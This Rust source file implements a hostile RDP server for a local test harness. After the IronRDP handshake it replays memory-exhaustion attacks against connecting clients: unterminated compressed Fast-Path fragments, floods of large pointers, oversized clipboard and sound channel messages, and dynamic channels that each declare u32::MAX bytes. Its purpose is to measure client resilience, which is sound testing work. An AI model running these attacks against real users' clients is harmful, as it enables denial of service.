//! B5 hostile RDP server (server-memory design 0ba44ae2, K8).
//!
//! Accepts a client over TLS (no NLA, so no credentials are checked), finishes the IronRDP
//! acceptor sequence and then owns the stream: it writes one small bitmap (the client's first
//! frame) and, from connection `--warmup + 1` on, replays one attack as raw frames, writes one
//! more bitmap and keeps the connection open until the client leaves. Warm-up connections only
//! get the bitmap, so the harness can take a footprint baseline against the same server.
//!
//! Attacks (sizes are arguments, see `Harness/docker/scenarios/mem-*.json`):
//!   fp-mppc      Fast-Path LargePointer First + MPPC-64K compressed Next fragments, never Last
//!   pointer      Large pointers 384x384 at cache indexes 0..count (client advertises 32)
//!   svc-cliprdr  one cliprdr FormatDataResponse of `bytes`, in 16 000-byte static chunks
//!   svc-rdpsnd   one rdpsnd message of `bytes`, same chunking
//!   dvc-fanout   `count` AUDIO_PLAYBACK_DVC Creates, each followed by a DataFirst that declares
//!                u32::MAX and carries `partial` bytes
//!
//! Only for the local harness: never point a real client at it outside a test.

use std::borrow::Cow;
use std::path::PathBuf;
use std::time::Duration;

use ironrdp_acceptor::{Acceptor, BeginResult, DesktopSize};
use ironrdp_bulk::{flags as bulk_flags, BulkCompressor, CompressionType as BulkType};
use ironrdp_core::{encode_vec, impl_as_any};
use ironrdp_dvc::pdu::{CreateRequestPdu, DataFirstPdu, DrdynvcDataPdu, DrdynvcServerPdu};
use ironrdp_pdu::bitmap::{BitmapData, BitmapUpdateData, Compression};
use ironrdp_pdu::fast_path::{EncryptionFlags, FastPathHeader, FastPathUpdatePdu, Fragmentation, UpdateCode};
use ironrdp_pdu::gcc::ChannelName;
use ironrdp_pdu::geometry::InclusiveRectangle;
use ironrdp_pdu::mcs::SendDataIndication;
use ironrdp_pdu::nego::SecurityProtocol;
use ironrdp_pdu::pointer::{LargePointerAttribute, Point16};
use ironrdp_pdu::rdp::capability_sets::{self as caps, CapabilitySet};
use ironrdp_pdu::rdp::client_info::CompressionType;
use ironrdp_pdu::rdp::headers::CompressionFlags;
use ironrdp_pdu::x224::X224;
use ironrdp_pdu::PduResult;
use ironrdp_server::TlsIdentityCtx;
use ironrdp_svc::{SvcMessage, SvcProcessor, SvcServerProcessor};
use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
use tokio::net::TcpListener;

type Error = Box<dyn std::error::Error + Send + Sync>;

const DESKTOP: DesktopSize = DesktopSize { width: 1024, height: 768 };
// MCS Send Data Indication carries a PER length, which IronRDP encodes in two bytes up to 0x3FFF.
const SVC_CHUNK: usize = 16_000;
const CHANNEL_FLAG_FIRST: u32 = 0x1;
const CHANNEL_FLAG_LAST: u32 = 0x2;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Attack {
    FpMppc,
    Pointer,
    SvcCliprdr,
    SvcRdpsnd,
    DvcFanout,
}

impl Attack {
    fn parse(name: &str) -> Option<Self> {
        Some(match name {
            "fp-mppc" => Self::FpMppc,
            "pointer" => Self::Pointer,
            "svc-cliprdr" => Self::SvcCliprdr,
            "svc-rdpsnd" => Self::SvcRdpsnd,
            "dvc-fanout" => Self::DvcFanout,
            _ => return None,
        })
    }
}

#[derive(Clone, Debug)]
struct Args {
    bind: String,
    cert: PathBuf,
    key: PathBuf,
    attack: Attack,
    warmup: u32,
    bytes: usize,
    count: u32,
    partial: usize,
    delay: Duration,
}

fn parse_args() -> Result<Args, Error> {
    let mut args = Args {
        bind: "0.0.0.0:3389".to_owned(),
        cert: PathBuf::from("/certs/b5.pem"),
        key: PathBuf::from("/certs/b5-key.pem"),
        attack: Attack::FpMppc,
        warmup: 1,
        bytes: 0,
        count: 0,
        partial: 0,
        delay: Duration::from_secs(2),
    };
    let mut attack = None;
    let mut it = std::env::args().skip(1);
    while let Some(flag) = it.next() {
        let value = it.next().ok_or_else(|| format!("{flag} needs a value"))?;
        match flag.as_str() {
            "--bind" => args.bind = value,
            "--cert" => args.cert = value.into(),
            "--key" => args.key = value.into(),
            "--attack" => attack = Some(Attack::parse(&value).ok_or_else(|| format!("unknown attack {value}"))?),
            "--warmup" => args.warmup = value.parse()?,
            "--bytes" => args.bytes = value.parse()?,
            "--count" => args.count = value.parse()?,
            "--partial" => args.partial = value.parse()?,
            "--delay-ms" => args.delay = Duration::from_millis(value.parse()?),
            other => return Err(format!("unknown flag {other}").into()),
        }
    }
    args.attack = attack.ok_or("--attack is required")?;
    Ok(args)
}

/// Placeholder processors: attaching them makes the acceptor report the channel IDs the client
/// was given for these names. They never answer anything.
macro_rules! named_channel {
    ($ty:ident, $name:literal) => {
        #[derive(Debug)]
        struct $ty;
        impl_as_any!($ty);
        impl SvcProcessor for $ty {
            fn channel_name(&self) -> ChannelName {
                ChannelName::from_static($name)
            }
            fn process(&mut self, _payload: &[u8]) -> PduResult<Vec<SvcMessage>> {
                Ok(Vec::new())
            }
        }
        impl SvcServerProcessor for $ty {}
    };
}

named_channel!(Cliprdr, b"cliprdr\0");
named_channel!(Rdpsnd, b"rdpsnd\0\0");
named_channel!(Drdynvc, b"drdynvc\0");

/// The capability sets of `ironrdp-server` (capabilities.rs) with fixed values.
fn capabilities() -> Vec<CapabilitySet> {
    vec![
        CapabilitySet::General(caps::General {
            extra_flags: caps::GeneralExtraFlags::FASTPATH_OUTPUT_SUPPORTED,
            refresh_rect_support: true,
            suppress_output_support: true,
            ..Default::default()
        }),
        CapabilitySet::Bitmap(caps::Bitmap {
            pref_bits_per_pix: 32,
            desktop_width: DESKTOP.width,
            desktop_height: DESKTOP.height,
            desktop_resize_flag: true,
            drawing_flags: caps::BitmapDrawingFlags::empty(),
        }),
        CapabilitySet::Order(caps::Order::new(
            caps::OrderFlags::empty(),
            caps::OrderSupportExFlags::empty(),
            2048,
            224,
        )),
        CapabilitySet::SurfaceCommands(caps::SurfaceCommands {
            flags: caps::CmdFlags::all(),
        }),
        CapabilitySet::Pointer(caps::Pointer {
            color_pointer_cache_size: 2048,
            pointer_cache_size: 2048,
        }),
        CapabilitySet::Input(caps::Input {
            input_flags: caps::InputFlags::SCANCODES
                | caps::InputFlags::MOUSEX
                | caps::InputFlags::FASTPATH_INPUT
                | caps::InputFlags::UNICODE
                | caps::InputFlags::FASTPATH_INPUT_2,
            keyboard_layout: 0,
            keyboard_type: None,
            keyboard_subtype: 0,
            keyboard_function_key: 128,
            keyboard_ime_filename: "".into(),
        }),
        CapabilitySet::VirtualChannel(caps::VirtualChannel {
            flags: caps::VirtualChannelFlags::NO_COMPRESSION,
            chunk_size: None,
        }),
        CapabilitySet::MultiFragmentUpdate(caps::MultifragmentUpdate {
            max_request_size: 8 * 1024 * 1024,
        }),
        CapabilitySet::BitmapCodecs(caps::BitmapCodecs(Vec::new())),
        CapabilitySet::LargePointer(caps::LargePointer {
            flags: caps::LargePointerSupportFlags::UP_TO_96X96_PIXELS
                | caps::LargePointerSupportFlags::UP_TO_384X384_PIXELS,
        }),
    ]
}

// ------------------------------------------------------------------ frame builders

fn fast_path_update(fragmentation: Fragmentation, code: UpdateCode, data: &[u8], bulk: Option<u32>) -> Vec<u8> {
    let (compression_flags, compression_type) = match bulk {
        Some(flags) if flags & bulk_flags::PACKET_COMPRESSED != 0 => (
            Some(CompressionFlags::from_bits_retain((flags & 0xE0) as u8)),
            Some(CompressionType::K64),
        ),
        _ => (None, None),
    };
    encode_vec(&FastPathUpdatePdu {
        fragmentation,
        update_code: code,
        compression_flags,
        compression_type,
        data,
    })
    .expect("encode fast-path update")
}

/// Packs updates into Fast-Path PDUs of at most 0x7FFF bytes.
fn pack(updates: &[Vec<u8>]) -> Vec<Vec<u8>> {
    fn flush(body: &mut Vec<u8>, pdus: &mut Vec<Vec<u8>>) {
        if body.is_empty() {
            return;
        }
        let mut pdu = encode_vec(&FastPathHeader::new(EncryptionFlags::empty(), body.len())).expect("encode header");
        pdu.extend_from_slice(body);
        assert!(pdu.len() <= 0x7FFF, "fast-path PDU too long: {}", pdu.len());
        pdus.push(pdu);
        body.clear();
    }
    let mut pdus = Vec::new();
    let mut body = Vec::new();
    for update in updates {
        if body.len() + update.len() + 3 > 0x7FFF {
            flush(&mut body, &mut pdus);
        }
        body.extend_from_slice(update);
    }
    flush(&mut body, &mut pdus);
    pdus
}

/// One uncompressed 64x64 32 bpp bitmap at the top left corner.
fn bitmap(shade: u8) -> Vec<u8> {
    let pixels = vec![shade; 64 * 64 * 4];
    let update = BitmapUpdateData {
        rectangles: vec![BitmapData {
            rectangle: InclusiveRectangle {
                left: 0,
                top: 0,
                right: 63,
                bottom: 63,
            },
            width: 64,
            height: 64,
            bits_per_pixel: 32,
            compression_flags: Compression::empty(),
            compressed_data_header: None,
            bitmap_data: &pixels,
        }],
    };
    let data = encode_vec(&update).expect("encode bitmap");
    let mut pdus = pack(&[fast_path_update(Fragmentation::Single, UpdateCode::Bitmap, &data, None)]);
    assert_eq!(pdus.len(), 1);
    pdus.pop().expect("one PDU")
}

/// One static virtual channel chunk inside MCS Send Data Indication.
fn svc_chunk(user_channel_id: u16, channel_id: u16, total: u32, flags: u32, chunk: &[u8]) -> Vec<u8> {
    let mut data = Vec::with_capacity(8 + chunk.len());
    data.extend_from_slice(&total.to_le_bytes());
    data.extend_from_slice(&flags.to_le_bytes());
    data.extend_from_slice(chunk);
    encode_vec(&X224(SendDataIndication {
        initiator_id: user_channel_id,
        channel_id,
        user_data: Cow::Owned(data),
    }))
    .expect("encode send data indication")
}

// ------------------------------------------------------------------ connection

struct Sink<W> {
    writer: W,
    wire: u64,
}

impl<W: tokio::io::AsyncWrite + Unpin> Sink<W> {
    async fn send(&mut self, frame: &[u8]) -> std::io::Result<()> {
        self.writer.write_all(frame).await?;
        self.wire += frame.len() as u64;
        Ok(())
    }
}

struct Ids {
    user: u16,
    cliprdr: Option<u16>,
    rdpsnd: Option<u16>,
    drdynvc: Option<u16>,
}

async fn attack<W: tokio::io::AsyncWrite + Unpin>(args: &Args, ids: &Ids, sink: &mut Sink<W>) -> Result<String, Error> {
    match args.attack {
        Attack::FpMppc => {
            let mut compressor = BulkCompressor::new(BulkType::Rdp5);
            let zeros = vec![0u8; 16_000];
            let mut compressed = |fragmentation| -> Result<Vec<u8>, Error> {
                let (size, flags) = compressor.compress(&zeros)?;
                if flags & bulk_flags::PACKET_COMPRESSED == 0 {
                    return Err("MPPC compressor returned an uncompressed packet".into());
                }
                let data = compressor.compressed_data(size).to_vec();
                Ok(fast_path_update(fragmentation, UpdateCode::LargePointer, &data, Some(flags)))
            };
            for pdu in pack(&[compressed(Fragmentation::First)?]) {
                sink.send(&pdu).await?;
            }
            let mut reassembled = zeros.len();
            while reassembled < args.bytes {
                let mut batch = Vec::with_capacity(256);
                for _ in 0..256 {
                    batch.push(compressed(Fragmentation::Next)?);
                    reassembled += zeros.len();
                }
                for pdu in pack(&batch) {
                    sink.send(&pdu).await?;
                }
            }
            Ok(format!("reassembled={reassembled}"))
        }
        Attack::Pointer => {
            const EDGE: u16 = 384;
            let stride = usize::from(EDGE).div_ceil(16) * 2;
            let mask = vec![0u8; stride * usize::from(EDGE)];
            for index in 0..args.count {
                let encoded = encode_vec(&LargePointerAttribute {
                    xor_bpp: 1,
                    cache_index: u16::try_from(index)?,
                    hot_spot: Point16 { x: 0, y: 0 },
                    width: EDGE,
                    height: EDGE,
                    xor_mask: &mask,
                    and_mask: &mask,
                })?;
                let pieces: Vec<&[u8]> = encoded.chunks(30_000).collect();
                for (i, piece) in pieces.iter().enumerate() {
                    let fragmentation = match (i, pieces.len()) {
                        (_, 1) => Fragmentation::Single,
                        (0, _) => Fragmentation::First,
                        (i, n) if i + 1 == n => Fragmentation::Last,
                        _ => Fragmentation::Next,
                    };
                    for pdu in pack(&[fast_path_update(fragmentation, UpdateCode::LargePointer, piece, None)]) {
                        sink.send(&pdu).await?;
                    }
                }
            }
            Ok(format!("pointers={} edge={EDGE}", args.count))
        }
        Attack::SvcCliprdr | Attack::SvcRdpsnd => {
            let channel = if args.attack == Attack::SvcCliprdr { ids.cliprdr } else { ids.rdpsnd };
            let channel = channel.ok_or("the client did not join the channel")?;
            let total = u32::try_from(args.bytes)?;
            let mut header = Vec::new();
            if args.attack == Attack::SvcCliprdr {
                // CLIPRDR_HEADER: CB_FORMAT_DATA_RESPONSE, CB_RESPONSE_OK, dataLen.
                header.extend_from_slice(&0x0005u16.to_le_bytes());
                header.extend_from_slice(&0x0001u16.to_le_bytes());
                header.extend_from_slice(&(total - 8).to_le_bytes());
            }
            let body = vec![0u8; SVC_CHUNK];
            let mut sent = 0usize;
            while sent < args.bytes {
                let len = SVC_CHUNK.min(args.bytes - sent);
                let mut chunk = Cow::Borrowed(&body[..len]);
                if sent == 0 && !header.is_empty() {
                    let mut first = header.clone();
                    first.extend_from_slice(&body[..len - header.len()]);
                    chunk = Cow::Owned(first);
                }
                let mut flags = 0;
                if sent == 0 {
                    flags |= CHANNEL_FLAG_FIRST;
                }
                if sent + len == args.bytes {
                    flags |= CHANNEL_FLAG_LAST;
                }
                sink.send(&svc_chunk(ids.user, channel, total, flags, &chunk)).await?;
                sent += len;
            }
            Ok(format!("channel={channel} message={sent}"))
        }
        Attack::DvcFanout => {
            let channel = ids.drdynvc.ok_or("the client did not join drdynvc")?;
            let mut opened = 0;
            for id in 1..=args.count {
                let mut messages = vec![DrdynvcServerPdu::Create(CreateRequestPdu::new(
                    id,
                    "AUDIO_PLAYBACK_DVC".to_owned(),
                ))];
                if args.partial > 0 {
                    messages.push(DrdynvcServerPdu::Data(DrdynvcDataPdu::DataFirst(DataFirstPdu::new(
                        id,
                        u32::MAX,
                        vec![0u8; args.partial],
                    ))));
                }
                for message in messages {
                    let body = encode_vec(&message)?;
                    let total = u32::try_from(body.len())?;
                    let chunks: Vec<&[u8]> = body.chunks(SVC_CHUNK).collect();
                    for (i, chunk) in chunks.iter().enumerate() {
                        let mut flags = 0;
                        if i == 0 {
                            flags |= CHANNEL_FLAG_FIRST;
                        }
                        if i + 1 == chunks.len() {
                            flags |= CHANNEL_FLAG_LAST;
                        }
                        sink.send(&svc_chunk(ids.user, channel, total, flags, chunk)).await?;
                    }
                }
                opened += 1;
            }
            Ok(format!("creates={opened} partial={}", args.partial))
        }
    }
}

async fn serve(args: &Args, tls: &tokio_rustls::TlsAcceptor, stream: tokio::net::TcpStream, active: &mut u32) -> Result<(), Error> {
    let mut acceptor = Acceptor::new(SecurityProtocol::SSL, DESKTOP, capabilities(), None);
    acceptor.attach_static_channel(Cliprdr);
    acceptor.attach_static_channel(Rdpsnd);
    acceptor.attach_static_channel(Drdynvc);
    let framed = ironrdp_tokio::TokioFramed::new(stream);
    let BeginResult::ShouldUpgrade(stream) = ironrdp_acceptor::accept_begin(framed, &mut acceptor).await? else {
        return Err("client did not negotiate TLS".into());
    };
    let stream = tls.accept(stream).await?;
    acceptor.mark_security_upgrade_as_done();
    let framed = ironrdp_tokio::TokioFramed::new(stream);
    let (framed, result) = ironrdp_acceptor::accept_finalize(framed, &mut acceptor).await?;
    // Only connections that reach the active phase count: port probes do not use up the warm-up.
    *active += 1;
    let n = *active;
    let ids = Ids {
        user: result.user_channel_id,
        cliprdr: result.static_channels.get_channel_id_by_type::<Cliprdr>(),
        rdpsnd: result.static_channels.get_channel_id_by_type::<Rdpsnd>(),
        drdynvc: result.static_channels.get_channel_id_by_type::<Drdynvc>(),
    };
    println!(
        "b5 connection={n} active user={} cliprdr={:?} rdpsnd={:?} drdynvc={:?}",
        ids.user, ids.cliprdr, ids.rdpsnd, ids.drdynvc
    );
    let (stream, _leftover) = framed.into_inner();
    let (mut reader, writer) = tokio::io::split(stream);
    // The client's own PDUs (input, refresh requests, channel answers) are read and dropped.
    let drain = tokio::spawn(async move {
        let mut buf = vec![0u8; 64 * 1024];
        let mut total = 0u64;
        while let Ok(read) = reader.read(&mut buf).await {
            if read == 0 {
                break;
            }
            total += read as u64;
        }
        total
    });
    let mut sink = Sink { writer, wire: 0 };
    sink.send(&bitmap(0x40)).await?;
    if n > args.warmup {
        tokio::time::sleep(args.delay).await;
        let base = sink.wire;
        let outcome = attack(args, &ids, &mut sink).await;
        let wire = sink.wire - base;
        match outcome {
            Ok(detail) => {
                // A frame after the attack: the session must still decode normal updates.
                let after = sink.send(&bitmap(0xC0)).await.is_ok();
                println!(
                    "b5 connection={n} attack={:?} done wire={wire} {detail} after_bitmap_sent={after}",
                    args.attack
                );
            }
            Err(error) => println!(
                "b5 connection={n} attack={:?} stopped wire={wire} error={error}",
                args.attack
            ),
        }
    } else {
        println!("b5 connection={n} warmup");
    }
    let received = drain.await.unwrap_or(0);
    println!("b5 connection={n} closed client_bytes={received}");
    Ok(())
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<(), Error> {
    let args = parse_args()?;
    let tls = TlsIdentityCtx::init_from_paths(&args.cert, &args.key)?.make_acceptor()?;
    let listener = TcpListener::bind(&args.bind).await?;
    println!("b5 listening {} attack={:?} warmup={} bytes={} count={} partial={}",
        args.bind, args.attack, args.warmup, args.bytes, args.count, args.partial);
    let mut active = 0u32;
    loop {
        let (stream, peer) = listener.accept().await?;
        println!("b5 accepted {peer}");
        if let Err(error) = serve(&args, &tls, stream, &mut active).await {
            println!("b5 {peer} error={error}");
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn decoded_user_data(frame: &[u8]) -> Option<Vec<u8>> {
        let X224(indication) = ironrdp_core::decode::<X224<SendDataIndication<'_>>>(frame).ok()?;
        Some(indication.user_data.into_owned())
    }

    #[test]
    fn svc_chunks_survive_the_mcs_length_encoding() {
        let chunk = vec![7u8; SVC_CHUNK];
        let frame = svc_chunk(1002, 1005, 1 << 20, CHANNEL_FLAG_FIRST, &chunk);
        let data = decoded_user_data(&frame).expect("decodes");
        assert_eq!(&data[..4], &(1u32 << 20).to_le_bytes());
        assert_eq!(&data[8..], &chunk[..]);
    }

    // The first B5 run used 60 000-byte chunks: the PER length overflowed and the client's static
    // channel layer failed on garbage instead of meeting the attack.
    #[test]
    fn a_chunk_over_the_per_length_limit_does_not_round_trip() {
        let chunk = vec![7u8; 60_000];
        let frame = svc_chunk(1002, 1005, 60_000, CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST, &chunk);
        assert_ne!(decoded_user_data(&frame).map(|data| data.len()), Some(60_008));
    }
}
